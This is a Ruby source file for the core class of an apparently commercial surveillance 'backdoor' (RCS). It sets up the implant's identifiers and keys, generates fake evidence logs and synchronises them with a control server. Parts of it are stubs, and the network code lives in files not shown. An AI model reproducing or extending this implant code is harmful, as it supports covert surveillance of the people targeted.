#
#  The main file of the backdoor
#

# relatives
require_relative 'globals.rb'
require_relative 'sync.rb'
require_relative 'protocol.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'

# from System
require 'digest/md5'
require 'ostruct'

module RCS
module Backdoor
#
# This is the Backdoor object
# it needs the backdoor_id, instance and conf_key to be created
# all thos parameters need to be passed as string taken from the db
#
class Backdoor
  include Tracer
  
  attr_reader :id
  attr_reader :instance
  attr_reader :type
  attr_reader :conf_key
  attr_reader :signature
  attr_reader :version
  
  attr_reader :userid
  attr_reader :deviceid
  attr_reader :sourceid
  
  attr_reader :logs
  
  #setup all the backdoor parameters
  def initialize(id, instance, type, key, sign)    
    
    # initialize the trace facility with the working directory
    trace_init Dir.pwd
    
    trace :debug, "Backdoor instantiated: " << id
    
    # instantiate le empty log queue
    @logs = []
    
    # plain string 'RCS_000000000x'
    @id = id
    
    # the instance is passed as a string taken from the db
    # we need to convert to binary 
    @instance = instance.pack('H*')
    
    # the subtype of the backdoor (eg: WIN32, BLACKBERRY...)
    @type = type
    
    # the conf key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    @conf_key = Digest::MD5.digest key
  
    # the backdoor signature is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    @signature = Digest::MD5.digest sign
    
    # the backdoor version
    @version = Globals::VERSION
    
    # STUB ! (move to another place) used to identify the target    
    @userid = Globals::USERID
    @deviceid = Globals::DEVICEID
    @sourceid = Globals::SOURCEID
    
    begin
      # instantiate the sync object with the protocol to be used
      # and a reference to the backdoor
      @sync = Sync.new(:REST, self)
    rescue Exception => detail
      trace :fatal, "ERROR: " << detail.to_s
      raise
    end
  end
  
  # perform the synchronization with the server
  def sync(host)
    @sync.perform host
  end
  
  # create some logs
  def create_logs(num)
    num.times do
      @logs << Evidence.new
    end
  end
end

# this module is used only form bin/rcs-backdoor as a wrapper to
# execute the backdoor from command line
module Application

  def self.run!(*argv)
    puts "ciao run" << argv.to_s
    return 0
  end

end # Application::

end # Backdoor::
end # RCS::

if __FILE__ == $0
  include RCS::Tracer
  trace_init Dir.pwd
  
  begin
    trace :info, "Creating the backdoor..."
    b = RCS::Backdoor::Backdoor.new RCS::Backdoor::Globals::BACKDOOR_ID, 
                                    RCS::Backdoor::Globals::INSTANCE_ID, 
                                    RCS::Backdoor::Globals::BACKDOOR_TYPE, 
                                    RCS::Backdoor::Globals::CONF_KEY, 
                                    RCS::Backdoor::Globals::SIGNATURE
    
    trace :info, "Creating fake logs..."
    b.create_logs(5)
    
    trace :info, "Synchronizing..."
    b.sync RCS::Backdoor::Globals::SYNC_HOST
    
  rescue Exception => detail
    trace :fatal, "TRACE: " << detail.to_s
    exit
  end
end
